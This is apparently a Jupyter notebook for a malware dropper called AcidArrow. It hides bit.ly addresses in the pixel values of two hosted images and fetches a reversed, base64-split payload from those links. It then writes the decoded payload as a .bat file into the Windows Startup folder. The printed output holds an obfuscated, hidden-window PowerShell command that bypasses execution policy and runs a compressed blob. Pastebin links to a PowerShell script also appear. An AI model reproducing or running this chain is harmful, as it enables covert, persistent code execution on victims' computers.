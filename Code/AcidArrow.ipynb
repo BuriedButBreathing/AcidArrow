{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Information for Reference\n",
    "## RickPic URL\n",
    "![rick](https://i.imgur.com/7oMTBQM.jpg)\n",
    "## Powershell Script\n",
    "https://pastebin.com/raw/4yAuaCib\n",
    "\n",
    "https://pastebin.com/raw/tyxaTnx3\n",
    "\n",
    "## Drizzt Image\n",
    "![drizzt](https://i.imgur.com/9S0xglm.png)\n",
    "\n",
    "## Kaladin Image\n",
    "![kaladin](https://i.imgur.com/t3lGOWr.png)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from PIL import Image\n",
    "import requests\n",
    "import os\n",
    "import io\n",
    "import platform\n",
    "import base64"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# OS determination\n",
    "runningOS = platform.system().lower()\n",
    "detectedOS = \"\"\n",
    "if runningOS == \"linux\" or runningOS == \"linux2\":\n",
    "    exit\n",
    "elif runningOS == \"windows\":\n",
    "    detectedOS = \"windows\"\n",
    "elif runningOS == \"darwin\":\n",
    "    detectedOS = \"mac\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Dictionary of headers for Windows, Mac, and Linux\n",
    "headers_dict = {'windows':{\"Connection\": \"keep-alive\",\n",
    "        \"Upgrade-Insecure-Requests\": \"1\",\n",
    "        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36\",\n",
    "        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\",\n",
    "        \"Sec-Fetch-Site\": \"same-origin\",\n",
    "        \"Sec-Fetch-Mode\": \"navigate\",\n",
    "        \"Sec-Fetch-User\": \"?1\",\n",
    "        \"Sec-Fetch-Dest\": \"document\",\n",
    "        \"Referer\": \"https://www.google.com/\",\n",
    "        \"Accept-Encoding\": \"gzip, deflate, br\",\n",
    "        \"Accept-Language\": \"en-US,en;q=0.9\"},'darwin':{\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0\",\n",
    "        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\n",
    "        \"Accept-Language\": \"en-US,en;q=0.5\",\n",
    "        \"Referer\": \"https://www.google.com/\",\n",
    "        \"DNT\": \"1\",\n",
    "        \"Connection\": \"keep-alive\",\n",
    "        \"Upgrade-Insecure-Requests\": \"1\"},'linux':{\"User-Agent\": \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\",\n",
    "        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\n",
    "        \"Accept-Language\": \"en-US,en;q=0.5\",\n",
    "        \"Accept-Encoding\": \"gzip, deflate, br\",\n",
    "        \"Referer\": \"https://www.google.com/\",\n",
    "        \"DNT\": \"1\",\n",
    "        \"Connection\": \"keep-alive\",\n",
    "        \"Upgrade-Insecure-Requests\": \"1\"}}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# User Agent Creation\n",
    "userAgent = headers_dict.get(runningOS)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Web Request\n",
    "def GetImage(url,x,y):\n",
    "    response = requests.get(url, headers = userAgent)\n",
    "    imageGuts = io.BytesIO(response.content)\n",
    "    img = Image.open(imageGuts)\n",
    "    return img"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Drizzt Image\n",
    "drizzt = GetImage(\"https://raw.githubusercontent.com/BuriedButBreathing/AcidArrow/master/Assets/9S0xglm.png?raw=true\", 406, 306)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[50, 52, 73]\n"
     ]
    }
   ],
   "source": [
    "di = drizzt.load()\n",
    "dp = list(di[406,306])\n",
    "dp.remove(255)\n",
    "print(dp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Kaladin Image\n",
    "kaladin = GetImage(\"https://raw.githubusercontent.com/BuriedButBreathing/AcidArrow/master/Assets/t3lGOWr.png?raw=true\", 500, 787)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[84, 115, 255]\n",
      "[50, 52, 73]\n"
     ]
    }
   ],
   "source": [
    "ki = kaladin.load()\n",
    "kp = list(ki[500,787])\n",
    "kp.remove(255)\n",
    "print(kp)\n",
    "print(dp)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2IsLXTP\n",
      "https://bit.ly/2IsLXTP\n",
      "3n5144G\n",
      "https://bit.ly/3n5144G\n"
     ]
    }
   ],
   "source": [
    "# URI construction\n",
    "# 50 73 115 76 88 84 80\n",
    "uri1 = chr(dp[0]) + chr(dp[2]) + chr(kp[1]) + chr((dp[2]+3)) + chr((kp[0]+4)) + chr(kp[0]) + chr((kp[0]-4))\n",
    "# 51 110 53 49 52 52 71\n",
    "uri2 = chr((dp[0]+1)) + chr((kp[1]-5)) + chr((dp[1]+1)) + chr((dp[0]-1)) + chr(dp[1]) + chr(dp[1]) + chr((dp[2]-2))\n",
    "print(uri1)\n",
    "u1 = 'https://bit.ly/' + uri1\n",
    "print(u1)\n",
    "\n",
    "print(uri2)\n",
    "u2 = 'https://bit.ly/' + uri2\n",
    "print(u2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "First Half\n",
      "b'cE9XRVJzSGVMTCAtIE5vZVhJVCAtIG5vUFJPRkkgLSBuT05JTnRFUmFjdElWIC0gd0lOZG8gSGkgLSBOb0xPRyAtIEV4ZSBiWVBhc3MgIiAuICggJCBzSGVsTGlEIFsxXSsgJCBTSEVMbElEIFsxM10rJ3gnKSggTkV3LU9iSmVDVCBTeVNUZU0uaU8uc3RSRUFtcmVhZEVSKChORXctT2JKZUNUIGlvLkNPTXByRXNTSW9uLmRlZkxhdEVTVHJlYU0oW1N5c3RlbS5pTy5NZW1vcnlTdHJlQU1dIFtTWXN0RW0uY09uVmVydF06OmZSb01iYXNFNjRTVHJJbkcoICdiVmROYnhzM0VQMHJjeWhBQ2FXTjNTV1hsSEpMRERWd0RnbGdDN2tZUmhBcmN0SWVwTUwxb1VEYi85NTVNL3hjQmJhazFYQTQ4K2Jya2JxbUZmM3llZmZ5N254Ly9QTnU5OXZ1YnZmeDVuaTlQLy8xK25KN2VyOWFQNHpXUGY1cS9qWlhIODYzSjJQV3F3Y3NmWHovK09iTmgvUHZwNVV4bGxZcm1nYXlOQVYrYlVqZmZPU0hNSk9kdlNVemZUUDhGRmprUnp0UC9MSGwxZEY2ZmpUaFlKS3UySm1pTmROWGd3WHM4dDdHU1NSWTR0Y1c5bzdHR3M5dllTUUxQZXkzWm40eTFqbXN3NlFiOFk5bjZ5WldtMkZPb1pEeDdNR0VaL0c4RmNFeE9TQUdNTEZvR215S3BvVEZMNFlTMlF1NUVadWlHb1BFY1p6OGFrV2k1Q2FSRmRHVVZQQ1ZGZDNRTGpzUGthT2xHZXMyS3JOVk1sSm5pUTBUd3FUV0hIOTNvZFZEUnJMUFpQL1NJK25HZVdFTU8zMGZ0ZXdWT0wzVXhVVnlvTFRwemZtc2tyWkk2RVAybVZ3cWpDNkJucHJZc3orbmRlK1JoWFpuQ3BPeXZabzNLb1d6Rld4b3dWS3FOeXoyY1NFbjI2NkNtMTZEL1ZYVDZpbDNSSlBxWVZGd3lMYjBFd2c1eWk0bUY2bk5wVFFaYW5KUmdVdVRTT2I4azI0UUNOMytiZjkxVkxlTEtpQVU2dXVxQ1AzQzJwUTZaK0VaY1crV1BjenlHcUJNSU0rd0RVSEgxVXpQVU1WN1lJelRVWlJrNFNBVGJabHJUR0N1b0NqbGs2R1hRUmRxd0JOelIwVFEwV1BzU1FuTDBzeXR3dHdUdGtrYU5oWWFrVHMzNGp2MkdLZkVwRHdEN2tpYmpXZEVFUmJRMkQ0SXVreDFpakR4bEc2U0RG'\n",
      "Second Half\n",
      "b'VGNvaUNlSnNXY056TXRKUytIR2dlQ05nR2tHUWZiQmE4NUxQMGxOUXVTTVMrY3pCNlloT2RSQlpLL0hFMUJ4bkx2Y3VhUXlpWi80Z1RqaDM3QlppWHl1T2wwSkpvUUJiMmVGYkdrMzRaa1d4bGZDcG9ZUk1JR0xJYnAwVEl6QmwrQTF4U1VuR005b3BZVVdCZW5qRUxoMk9LOHFEZ09IejFmbGloYk1wUDlHbkFNVXVyYVdrazdPRkdSNG5HVzNUZDlxRk9TYk1HVVdrcHRLSDBqNlo4MUprWS82QW5JY0o3NkxrYU1LTUY4MlRuU1RMd3BTcXhPSEhIUFNFbHlhMURBL0lWRGx6ZDVRc0pSRjA0UWQxcnFwWDUrQ3RoNllyVzV6TTJWcUtkYnlxVXVzNkhXMGFsdEQxQ0JNc3VZSVdzQ0pveEpUajFzc1RzN0xSRG1LNVdmSngwam83a1djN1dYTTV3S3M5cVRvZW42aVJQWloxK0dWbzBuY0MxOFVzNVYyb0liQlNTMDAxbldNcFNOZzVRVVpCSzhoSnZoazJaQ2FzcmpPU2RFRGFCWmFHVk9jenNQMUMvWGlvdkRCVmp0U2FGVmxDOVJBUXkyVTFaU1lGT2ZBUXIzZTl3cTl6RllJR3duUXBxcHUrbndURHlaMmdXUzNLbndNR2NlNURzcHNXNGxKY3FmTWJjQ3ZHeGt1T3A1cmZnOXpscC9PU3FVWURYdFZjaFI4Q21pbG9jeTRjWjBveFNKZnZBbWFVU0ZLdURMR1FGZUtIMEtWenhING5zbzE0dEtBZWtvRWNib2N0YmVKWlBTTXFCczhPSmd6cGVtcGxTbGUwWWxMNXRvN0ZDdUhFTzZHSG1mbWl5NlRHS2NiZVhpT0pTSmJrWXZiTHVCVHR6WHRVRjZnaGlKVnV5b2NHRkF1V0RMZnlVOHFXZklxY1ZGM2lOUEtMRXZmSUFyUEc0aTZhSXJJRVNYb094eGM0QnlUTGQ5dlpDRVRwWEFvMG16c2FwWFNBUW5xUGordjZaLzZmblQzZTd0elkrcjg5TWZ1OE1yL2NNL2x4NXVQcDArSDEvMi9BTm96eitBOW1OWTRVZlVsK3ZYOC8zKzd2YjBmYlZlczgweHNJR3JyL2YwY1BqeDl1VngvZCthOFBjLycgKSwgW2lvLmNvbXByRXNzSU9OLmNPbXBSRVNzSU9uTU9kRV06OkRFY29NcFJlU1MgKSkgLCBbc3lzVEVNLlRleHQuZU5Db0RJTmddOjpBc2NpSSkgKS5yRUFEdE9FbkQoKSAi'\n",
      "b'cE9XRVJzSGVMTCAtIE5vZVhJVCAtIG5vUFJPRkkgLSBuT05JTnRFUmFjdElWIC0gd0lOZG8gSGkgLSBOb0xPRyAtIEV4ZSBiWVBhc3MgIiAuICggJCBzSGVsTGlEIFsxXSsgJCBTSEVMbElEIFsxM10rJ3gnKSggTkV3LU9iSmVDVCBTeVNUZU0uaU8uc3RSRUFtcmVhZEVSKChORXctT2JKZUNUIGlvLkNPTXByRXNTSW9uLmRlZkxhdEVTVHJlYU0oW1N5c3RlbS5pTy5NZW1vcnlTdHJlQU1dIFtTWXN0RW0uY09uVmVydF06OmZSb01iYXNFNjRTVHJJbkcoICdiVmROYnhzM0VQMHJjeWhBQ2FXTjNTV1hsSEpMRERWd0RnbGdDN2tZUmhBcmN0SWVwTUwxb1VEYi85NTVNL3hjQmJhazFYQTQ4K2Jya2JxbUZmM3llZmZ5N254Ly9QTnU5OXZ1YnZmeDVuaTlQLy8xK25KN2VyOWFQNHpXUGY1cS9qWlhIODYzSjJQV3F3Y3NmWHovK09iTmgvUHZwNVV4bGxZcm1nYXlOQVYrYlVqZmZPU0hNSk9kdlNVemZUUDhGRmprUnp0UC9MSGwxZEY2ZmpUaFlKS3UySm1pTmROWGd3WHM4dDdHU1NSWTR0Y1c5bzdHR3M5dllTUUxQZXkzWm40eTFqbXN3NlFiOFk5bjZ5WldtMkZPb1pEeDdNR0VaL0c4RmNFeE9TQUdNTEZvR215S3BvVEZMNFlTMlF1NUVadWlHb1BFY1p6OGFrV2k1Q2FSRmRHVVZQQ1ZGZDNRTGpzUGthT2xHZXMyS3JOVk1sSm5pUTBUd3FUV0hIOTNvZFZEUnJMUFpQL1NJK25HZVdFTU8zMGZ0ZXdWT0wzVXhVVnlvTFRwemZtc2tyWkk2RVAybVZ3cWpDNkJucHJZc3orbmRlK1JoWFpuQ3BPeXZabzNLb1d6Rld4b3dWS3FOeXoyY1NFbjI2NkNtMTZEL1ZYVDZpbDNSSlBxWVZGd3lMYjBFd2c1eWk0bUY2bk5wVFFaYW5KUmdVdVRTT2I4azI0UUNOMytiZjkxVkxlTEtpQVU2dXVxQ1AzQzJwUTZaK0VaY1crV1BjenlHcUJNSU0rd0RVSEgxVXpQVU1WN1lJelRVWlJrNFNBVGJabHJUR0N1b0NqbGs2R1hRUmRxd0JOelIwVFEwV1BzU1FuTDBzeXR3dHdUdGtrYU5oWWFrVHMzNGp2MkdLZkVwRHdEN2tpYmpXZEVFUmJRMkQ0SXVreDFpakR4bEc2U0RGVGNvaUNlSnNXY056TXRKUytIR2dlQ05nR2tHUWZiQmE4NUxQMGxOUXVTTVMrY3pCNlloT2RSQlpLL0hFMUJ4bkx2Y3VhUXlpWi80Z1RqaDM3QlppWHl1T2wwSkpvUUJiMmVGYkdrMzRaa1d4bGZDcG9ZUk1JR0xJYnAwVEl6QmwrQTF4U1VuR005b3BZVVdCZW5qRUxoMk9LOHFEZ09IejFmbGloYk1wUDlHbkFNVXVyYVdrazdPRkdSNG5HVzNUZDlxRk9TYk1HVVdrcHRLSDBqNlo4MUprWS82QW5JY0o3NkxrYU1LTUY4MlRuU1RMd3BTcXhPSEhIUFNFbHlhMURBL0lWRGx6ZDVRc0pSRjA0UWQxcnFwWDUrQ3RoNllyVzV6TTJWcUtkYnlxVXVzNkhXMGFsdEQxQ0JNc3VZSVdzQ0pveEpUajFzc1RzN0xSRG1LNVdmSngwam83a1djN1dYTTV3S3M5cVRvZW42aVJQWloxK0dWbzBuY0MxOFVzNVYyb0liQlNTMDAxbldNcFNOZzVRVVpCSzhoSnZoazJaQ2FzcmpPU2RFRGFCWmFHVk9jenNQMUMvWGlvdkRCVmp0U2FGVmxDOVJBUXkyVTFaU1lGT2ZBUXIzZTl3cTl6RllJR3duUXBxcHUrbndURHlaMmdXUzNLbndNR2NlNURzcHNXNGxKY3FmTWJjQ3ZHeGt1T3A1cmZnOXpscC9PU3FVWURYdFZjaFI4Q21pbG9jeTRjWjBveFNKZnZBbWFVU0ZLdURMR1FGZUtIMEtWenhING5zbzE0dEtBZWtvRWNib2N0YmVKWlBTTXFCczhPSmd6cGVtcGxTbGUwWWxMNXRvN0ZDdUhFTzZHSG1mbWl5NlRHS2NiZVhpT0pTSmJrWXZiTHVCVHR6WHRVRjZnaGlKVnV5b2NHRkF1V0RMZnlVOHFXZklxY1ZGM2lOUEtMRXZmSUFyUEc0aTZhSXJJRVNYb094eGM0QnlUTGQ5dlpDRVRwWEFvMG16c2FwWFNBUW5xUGordjZaLzZmblQzZTd0elkrcjg5TWZ1OE1yL2NNL2x4NXVQcDArSDEvMi9BTm96eitBOW1OWTRVZlVsK3ZYOC8zKzd2YjBmYlZlczgweHNJR3JyL2YwY1BqeDl1VngvZCthOFBjLycgKSwgW2lvLmNvbXByRXNzSU9OLmNPbXBSRVNzSU9uTU9kRV06OkRFY29NcFJlU1MgKSkgLCBbc3lzVEVNLlRleHQuZU5Db0RJTmddOjpBc2NpSSkgKS5yRUFEdE9FbkQoKSAi'\n"
     ]
    }
   ],
   "source": [
    "# Command Retrieval\n",
    "firstHalf = requests.get(u1, userAgent)\n",
    "fh = firstHalf.content[::-1]\n",
    "print('First Half')\n",
    "print(fh)\n",
    "secondHalf = requests.get(u2, userAgent)\n",
    "sh = secondHalf.content[::-1]\n",
    "print('Second Half')\n",
    "print(sh)\n",
    "cs = fh + sh\n",
    "print(cs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Payload Drop\n",
    "r = base64.b64decode(cs)\n",
    "with open('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\helloworld.bat', 'wb') as f:\n",
    "    f.write(r)"
   ]
  }
 ],
 "metadata": {
  "celltoolbar": "Raw Cell Format",
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  },
  "varInspector": {
   "cols": {
    "lenName": 16,
    "lenType": 16,
    "lenVar": 40
   },
   "kernels_config": {
    "python": {
     "delete_cmd_postfix": "",
     "delete_cmd_prefix": "del ",
     "library": "var_list.py",
     "varRefreshCmd": "print(var_dic_list())"
    },
    "r": {
     "delete_cmd_postfix": ") ",
     "delete_cmd_prefix": "rm(",
     "library": "var_list.r",
     "varRefreshCmd": "cat(var_dic_list()) "
    }
   },
   "types_to_exclude": [
    "module",
    "function",
    "builtin_function_or_method",
    "instance",
    "_Feature"
   ],
   "window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
